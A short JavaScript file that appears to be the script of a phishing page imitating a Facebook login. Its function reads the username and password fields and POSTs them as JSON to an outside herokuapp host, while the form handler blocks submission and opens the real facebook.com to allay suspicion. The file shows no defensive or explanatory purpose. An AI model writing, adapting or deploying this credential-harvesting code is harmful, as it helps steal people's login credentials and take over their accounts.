const loginfrm = document.getElementById('login-form');
const login = document.getElementById('login');
const url = "https://fuckphish.herokuapp.com/";
    
var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

function loginf() {
        
    let uname = document.getElementById('uname').value;
    let passwd = document.getElementById('passwd').value;
    let logindata = `{"uname":"${uname}","passwd":"${passwd}"}`;

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: logindata,
        redirect: 'follow'
    };

    fetch(url, requestOptions)
        .then(response => response.text())
        .then(result => console.log(result))
        .catch(error => console.log('error', error));

        
}

loginfrm.addEventListener('submit', function(e) {
    e.preventDefault();
    window.open('https://www.facebook.com/','_blank').focus();

});
